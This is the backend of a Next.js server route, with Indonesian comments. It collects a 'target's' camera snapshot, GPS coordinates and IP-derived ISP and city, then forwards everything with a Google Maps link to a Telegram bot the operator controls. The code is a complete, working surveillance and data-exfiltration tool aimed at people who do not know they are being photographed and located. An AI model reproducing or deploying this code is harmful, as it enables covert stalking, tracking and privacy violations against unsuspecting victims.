import { NextResponse } from "next/server";
import axios from "axios";

export async function POST(req: Request) {
  try {
    const { image, gps } = await req.json();
    
    // Ambil alamat IP Target dari header
    let ip = req.headers.get("x-forwarded-for") || "1.1.1.1";
    if (ip.includes(',')) ip = ip.split(',')[0].trim();

    // Dapatkan info ISP & Kota berdasarkan IP
    const geoRes = await axios.get(`http://ip-api.com/json/${ip}`).catch(() => ({ data: {} }));
    const geo = geoRes.data;

    // Buat Pesan Laporan
    let caption = `🔔 *Target Terdeteksi!*\n\n`;
    caption += `🌐 *IP:* \`${geo.query || ip}\` \n`;
    caption += `📍 *ISP:* ${geo.isp || "Tidak diketahui"}\n`;
    caption += `🏢 *Lokasi:* ${geo.city || "?"}, ${geo.country || "?"}\n`;

    if (gps) {
      caption += `🎯 *GPS:* [Buka di Google Maps](https://www.google.com/maps?q=${gps.lat},${gps.lon})\n`;
    } else {
      caption += `⚠️ *GPS:* Akses lokasi ditolak target.\n`;
    }

    // Ubah Base64 Image menjadi Buffer (RAM)
    const base64Data = image.replace(/^data:image\/\w+;base64,/, "");
    const buffer = Buffer.from(base64Data, "base64");

    const formData = new FormData();
    formData.append("chat_id", process.env.TELEGRAM_CHAT_ID!);
    formData.append("photo", new Blob([buffer], { type: "image/png" }), "target_capture.png");
    formData.append("caption", caption);
    formData.append("parse_mode", "Markdown");

    // Kirim ke Bot Telegram
    await axios.post(
      `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendPhoto`,
      formData
    );

    return NextResponse.json({ success: true });
  } catch (error: any) {
    console.error("Error API:", error.message);
    return NextResponse.json({ error: "Gagal memproses laporan" }, { status: 500 });
  }
}